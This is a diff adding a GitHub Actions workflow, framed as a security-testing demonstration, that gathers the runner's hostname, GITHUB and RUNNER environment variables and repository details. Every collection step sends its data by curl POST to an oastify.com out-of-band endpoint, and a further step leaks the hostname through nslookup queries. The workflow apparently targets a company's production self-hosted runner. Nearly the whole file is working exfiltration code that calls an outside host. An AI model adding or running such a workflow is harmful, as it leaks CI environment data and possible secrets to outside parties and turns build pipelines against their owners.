@@ -1,0 +1,98 @@
+name: Data Exfiltration Demonstration
+
+# This workflow demonstrates how malicious actions can exfiltrate data
+# to external endpoints for security testing purposes
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_endpoint:
+        description: 'Target endpoint for data exfiltration'
+        required: true
+        default: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com'
+      data_type:
+        description: 'Type of data to exfiltrate'
+        required: true
+        default: 'hostname'
+        type: choice
+        options:
+        - hostname
+        - environment
+        - repository_info
+        - all
+
+jobs:
+  exfiltration-demo:
+    runs-on: af-slim-prd  # Using AppsFlyer runner for security
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Collect Hostname Data
+        if: ${{ github.event.inputs.data_type == 'hostname' || github.event.inputs.data_type == 'all' }}
+        run: |
+          echo "=== HOSTNAME DATA EXFILTRATION ==="
+          HOSTNAME_DATA=$(hostname)
+          echo "Collected hostname: $HOSTNAME_DATA"
+          
+          # Send to OAST endpoint
+          curl -X POST "https://${{ github.event.inputs.target_endpoint }}/hostname" \
+            -H "Content-Type: application/json" \
+            -d "{\"hostname\": \"$HOSTNAME_DATA\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"repository\": \"${{ github.repository }}\", \"actor\": \"${{ github.actor }}\"}" \
+            || echo "Failed to send hostname data"
+      
+      - name: Collect Environment Data
+        if: ${{ github.event.inputs.data_type == 'environment' || github.event.inputs.data_type == 'all' }}
+        run: |
+          echo "=== ENVIRONMENT DATA EXFILTRATION ==="
+          ENV_DATA=$(env | grep -E "(GITHUB|RUNNER)" | sort)
+          echo "Collected environment data:"
+          echo "$ENV_DATA"
+          
+          # Send to OAST endpoint
+          curl -X POST "https://${{ github.event.inputs.target_endpoint }}/environment" \
+            -H "Content-Type: application/json" \
+            -d "{\"environment\": \"$ENV_DATA\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"repository\": \"${{ github.repository }}\", \"actor\": \"${{ github.actor }}\"}" \
+            || echo "Failed to send environment data"
+      
+      - name: Collect Repository Information
+        if: ${{ github.event.inputs.data_type == 'repository_info' || github.event.inputs.data_type == 'all' }}
+        run: |
+          echo "=== REPOSITORY INFORMATION EXFILTRATION ==="
+          REPO_INFO=$(echo "Repository: ${{ github.repository }}, Actor: ${{ github.actor }}, Event: ${{ github.event_name }}, Ref: ${{ github.ref }}, SHA: ${{ github.sha }}")
+          echo "Collected repository info: $REPO_INFO"
+          
+          # Send to OAST endpoint
+          curl -X POST "https://${{ github.event.inputs.target_endpoint }}/repository" \
+            -H "Content-Type: application/json" \
+            -d "{\"repository_info\": \"$REPO_INFO\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"repository\": \"${{ github.repository }}\", \"actor\": \"${{ github.actor }}\"}" \
+            || echo "Failed to send repository data"
+      
+      - name: Demonstrate DNS Exfiltration
+        run: |
+          echo "=== DNS EXFILTRATION DEMONSTRATION ==="
+          HOSTNAME_DATA=$(hostname)
+          # Encode hostname in base64 for DNS exfiltration
+          ENCODED_DATA=$(echo -n "$HOSTNAME_DATA" | base64 | tr -d '=')
+          echo "Encoded hostname for DNS: $ENCODED_DATA"
+          
+          # Simulate DNS exfiltration (this won't actually work but shows the technique)
+          echo "Simulating DNS exfiltration to: $ENCODED_DATA.${{ github.event.inputs.target_endpoint }}"
+          nslookup "$ENCODED_DATA.${{ github.event.inputs.target_endpoint }}" || echo "DNS exfiltration simulation completed"
+      
+      - name: Show Exfiltration Summary
+        run: |
+          echo "=== EXFILTRATION SUMMARY ==="
+          echo "Target endpoint: ${{ github.event.inputs.target_endpoint }}"
+          echo "Data type: ${{ github.event.inputs.data_type }}"
+          echo "Repository: ${{ github.repository }}"
+          echo "Actor: ${{ github.actor }}"
+          echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo ""
+          echo "This demonstration shows how malicious actions can:"
+          echo "1. Collect sensitive information from the runner"
+          echo "2. Exfiltrate data to external endpoints"
+          echo "3. Use various exfiltration methods (HTTP, DNS)"
+          echo "4. Bypass network restrictions"
+          echo ""
+          echo "Check your OAST endpoint for received data!"
